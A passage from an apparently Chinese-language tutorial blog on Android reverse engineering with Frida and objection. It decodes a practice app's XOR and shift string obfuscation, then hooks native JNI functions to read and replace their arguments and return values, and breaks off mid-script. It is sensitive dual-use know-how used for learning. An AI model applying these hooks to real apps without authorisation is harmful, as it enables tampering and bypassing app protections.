class=""><p>现在这种情况只能逆向算法了。由于<code>a()</code>和<code>b()</code>传入的都是我们输入的信息，<code>a()</code>算法比<code>b()</code>算法要简单很多，如果输入的信息可以通过两个算法，那就可以免除逆向<code>b()</code>算法了，先来破解<code>a()</code>算法。</p><img src="/posts/ab7319a3/7.1.17.png" class=""><p><code>a()</code>算法的意思是将字符串转化为字符数组，第一个字符是最后一个字符异或’2’，最后一个字符是第一个字符异或’A’，第二个字符是倒数第二个字符异或’2’，倒数第二个字符是第二个字符异或’A’，以此类推。</p><p>可用Java写脚本，直接复制算法修改修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reverseA.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverseA</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decode_p</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">p</span> <span class="operator">=</span> <span class="string">&quot;V@]EAASB\u0012WZF\u0012e,a$7(&amp;am2(3.\u0003&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> reverse_a(p);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">reverse_a</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] charArray = str.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; charArray.length / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> charArray[i];</span><br><span class="line">            charArray[i] = (<span class="type">char</span>) (charArray[(charArray.length - i) - <span class="number">1</span>] ^ <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            charArray[(charArray.length - i) - <span class="number">1</span>] = (<span class="type">char</span>) (c ^ <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(charArray);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//编译成.class文件</span><br><span class="line">javac reverseA.java</span><br><span class="line"></span><br><span class="line">//编译成DEX文件</span><br><span class="line">java -jar dx.jar --dex --output=reverseA.dex reverseA.class</span><br></pre></td></tr></table></figure><p>将<code>reverseA.dex</code>文件push到手机的<code>/data/local/tmp</code>目录，授予777权限，使用js代码来加载它。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">message</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/reverseA.dex&quot;</span>).<span class="title function_">load</span>()</span><br><span class="line">        <span class="keyword">const</span> ra = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;reverseA&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reverseA result:&quot;</span>, ra.<span class="title function_">decode_p</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(message)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/7.1.18.png" class=""><p>结果发现群聊并没有第二条消息出来，也就是<code>a()</code>与<code>b()</code>传入的消息是不一样的。所以要接着逆向<code>b()</code>算法。</p><img src="/posts/ab7319a3/7.1.19.png" class=""><p>第一种方法：</p><p>分析代码可知变量r有很多不可见的字符，我们可以把变量r打印出来，使它成为可见字符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reverseB.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverseB</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">r_to_hex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">r</span> <span class="operator">=</span> <span class="string">&quot;\u0000dslp&#125;oQ\u0000 dks$|M\u0000h +AYQg\u0000P*!M$gQ\u0000&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = r.getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;bytes.length; i++)&#123;</span><br><span class="line">            result += String.format(<span class="string">&quot;%02x&quot;</span>,bytes[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">message</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/reverseB.dex&quot;</span>).<span class="title function_">load</span>()</span><br><span class="line">        <span class="keyword">const</span> rb = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;reverseB&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reverseB result:&quot;</span>, rb.<span class="title function_">r_to_hex</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(message)</span><br><span class="line"><span class="comment">//reverseB result: 0064736c707d6f510020646b73247c4d0068202b4159516700502a214d24675100</span></span><br></pre></td></tr></table></figure><p>由于<code>b()</code>算法有按位运算操作，确实有点麻烦，所以我们利用Z3库来求解这个问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install z3-solver</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#reverseB.py</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">r = <span class="string">&quot;0064736c707d6f510020646b73247c4d0068202b4159516700502a214d24675100&quot;</span></span><br><span class="line"></span><br><span class="line">r_result = <span class="built_in">bytearray</span>(a2b_hex(r))</span><br><span class="line"><span class="built_in">print</span>(r_result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span> (<span class="built_in">len</span>(r_result)/<span class="number">2</span>)):</span><br><span class="line">    c = r_result[i]</span><br><span class="line">    r_result[i] = r_result[<span class="built_in">len</span>(r_result)-i-<span class="number">1</span>]</span><br><span class="line">    r_result[<span class="built_in">len</span>(r_result)-i-<span class="number">1</span>] = c</span><br><span class="line"><span class="built_in">print</span>(b2a_hex(r_result))</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&quot;x%s&quot;</span> % i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r_result))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r_result)):</span><br><span class="line">    c = r_result[i]</span><br><span class="line">    <span class="built_in">print</span>(i,<span class="built_in">hex</span>(c))</span><br><span class="line">    s.add(((x[i] &gt;&gt; (i % <span class="number">8</span>)) ^ x[i]) == r_result[i])</span><br><span class="line"><span class="keyword">if</span>(s.check() == sat):</span><br><span class="line">    model = s.model()</span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r_result)):</span><br><span class="line">        <span class="keyword">if</span>(model[x[i]] != <span class="literal">None</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(model[x[i]].as_long().real)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="string">&quot; &quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&quot;&#x27;</span> + flag + <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(flag),<span class="built_in">len</span>(r_result))</span><br></pre></td></tr></table></figure><p>但是我用这个脚本时失败了，不知道什么原因。只能借用大佬的截图。</p><img src="/posts/ab7319a3/7.1.20.png" class=""><p>第二种方法：</p><p>后来看其它博客说可以用暴力枚举每个字符的方法解出明文：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reverseB.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverseB</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">search</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characterset</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r&quot;</span>;</span><br><span class="line">        <span class="type">char</span> [] charactersetArray = characterset.toCharArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">ciphertext</span> <span class="operator">=</span> <span class="string">&quot;\000dslp&#125;oQ\000 dks$|M\000h +AYQg\000P*!M$gQ\000&quot;</span>;</span><br><span class="line">        <span class="type">char</span> [] charArray = ciphertext.toCharArray();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; charArray.length / <span class="number">2</span>; i2++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> charArray[i2];</span><br><span class="line">            charArray[i2] = charArray[(charArray.length - i2) - <span class="number">1</span>];</span><br><span class="line">            charArray[(charArray.length - i2) - <span class="number">1</span>] = c;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        String plaintext=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; charArray.length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; charactersetArray.length ; j++ )&#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> charactersetArray[j];</span><br><span class="line">                <span class="type">char</span> <span class="variable">result</span> <span class="operator">=</span> (<span class="type">char</span>)(<span class="type">char</span>)((c &gt;&gt; (i % <span class="number">8</span>) )^ c);</span><br><span class="line">                <span class="keyword">if</span>(result == charArray[i])&#123;</span><br><span class="line">                    plaintext+=charactersetArray[j];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Log.i(&quot;ceshi&quot;, &quot;plaintext=&quot;+plaintext);</span></span><br><span class="line">        <span class="keyword">return</span> plaintext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样将JAVA文件转换为DEX文件，push到手机上授予权限，执行js代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">message</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/reverseA.dex&quot;</span>).<span class="title function_">load</span>()</span><br><span class="line">        <span class="keyword">const</span> ra = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;reverseA&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reverseA result:&quot;</span>, ra.<span class="title function_">decode_p</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/reverseB.dex&quot;</span>).<span class="title function_">load</span>()</span><br><span class="line">        <span class="keyword">const</span> rb = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;reverseB&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reverseB result:&quot;</span>, rb.<span class="title function_">search</span>())</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(message)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/7.1.21.png" class=""><p>哈哈哈发现暴力枚举也不太准确，flag里面有非法字符。应该用Z3是正确解法，但看不懂啊啊啊！好难！</p><h1 id="8-frida-Native-hook"><a href="#8-frida-Native-hook" class="headerlink" title="8. frida Native hook"></a>8. frida Native hook</h1><p>以上都是frida在Java层实现的hook操作，而到了JNI层，frida又是如何hook so库中的函数呢？</p><h2 id="8-1-Native-hook基本操作"><a href="#8-1-Native-hook基本操作" class="headerlink" title="8.1 Native hook基本操作"></a>8.1 Native hook基本操作</h2><p>有时候，当我们用IDA查看so库中的导出函数时(静态反编译)，可能会hook不成功，为什么呢？</p><ol><li>这个so库真的有被加载进内存吗？</li><li>so库中的导出函数真的有被加载进内存吗？</li><li>我们找的导出函数真的是我们想要找的导出函数吗？</li></ol><p>而这几个问题，完全可以通过objection来查看内存中的信息，验证是否是我们想要找的so库和导出函数。</p><p>用objection查看内存中加载的库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory list modules</span><br></pre></td></tr></table></figure><p>当然也可以使用js代码来查看so库在内存中的地址：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_nativelib</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, native_lib_addr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_nativelib)</span><br></pre></td></tr></table></figure><p>获得该so库在内存中的地址后，再找到导出函数的名字。同样可以用objection查看加载的库的导出函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory list exports libnative-lib.so</span><br></pre></td></tr></table></figure><p>可以使用js代码验证地址是否一致：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_nativelib</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, native_lib_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> myfirstjniJNI = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_example_demoso1_MainActivity_myfirstjniJNI&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;myfirstjniJNI addr =&gt;&quot;</span>, myfirstjniJNI)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_nativelib)</span><br></pre></td></tr></table></figure><p>接下来就是hook native，单纯打印该Native函数的参数和返回值：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_nativelib</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, native_lib_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> myfirstjniJNI = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_example_demoso1_MainActivity_myfirstjniJNI&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;myfirstjniJNI addr =&gt; &quot;</span>, myfirstjniJNI)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(myfirstjniJNI,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Interceptor.attach myfirstjniJNI args:&quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>])</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args2 jstring is &quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUTFChars</span>(args[<span class="number">2</span>],<span class="literal">null</span>).<span class="title function_">readCString</span>())</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Interceptor.attach myfirstjniJNI retval =&gt; &quot;</span>,retval)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval jstring is &quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUTFChars</span>(retval,<span class="literal">null</span>).<span class="title function_">readCString</span>())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_nativelib)</span><br></pre></td></tr></table></figure><p>确认可以打印并没有错误后，再进行修改参数和返回值的操作：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_nativelib</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, native_lib_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> myfirstjniJNI = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_example_demoso1_MainActivity_myfirstjniJNI&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;myfirstjniJNI addr =&gt; &quot;</span>, myfirstjniJNI)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(myfirstjniJNI,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Interceptor.attach myfirstjniJNI args:&quot;</span>, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>])</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args2 jstring is &quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUTFChars</span>(args[<span class="number">2</span>],<span class="literal">null</span>).<span class="title function_">readCString</span>())</span><br><span class="line">            <span class="keyword">var</span> newArgs2 = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">newStringUtf</span>(<span class="string">&quot;new Args2 from frida&quot;</span>)</span><br><span class="line">            args[<span class="number">2</span>] = newArgs2</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Interceptor.attach myfirstjniJNI retval =&gt; &quot;</span>,retval)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval jstring is &quot;</span>,<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUTFChars</span>(retval,<span class="literal">null</span>).<span class="title function_">readCString</span>())</span><br><span class="line">            <span class="keyword">var</span> newRetval = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">newStringUtf</span>(<span class="string">&quot;new Retval from frida&quot;</span>)</span><br><span class="line">            retval.<span class="title function_">replace</span>(newRetval)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_nativelib)</span><br></pre></td></tr></table></figure><p>除了基本操作，还可以让这个Native函数不运行，基于主动调用。</p><h2 id="8-2-主动调用"><a href="#8-2-主动调用" class="headerlink" title="8.2 主动调用"></a>8.2 主动调用</h2><p>当我们想找一个函数却发现内存中没有类似于“Java_com_example_demoso1_MainActivity_v5add”的Native函数名时，不一定函数没有加载进内存，而是改了个名字。比如<code>_Z5v5addii</code>，这时候就看不出来它是哪个函数，可以拿到 <a href="http://demangler.com/">http://demangler.com/</a> 去demangle一下，就得到函数原本的定义。</p><img src="/posts/ab7319a3/15.6.1.png" class="" title="Demangle"><p>比如下面这个Native函数，对它进行主动调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">v5add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;x; i++)&#123;</span><br><span class="line">        i = i + y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是先要找到so库和Native函数地址，再对函数进行主动调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookandinvoke_add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> native_lib_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;native_lib_addr =&gt; &quot;</span>, native_lib_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> v5add_addr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;_Z5v5addii&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;v5add addr =&gt; &quot;</span>, 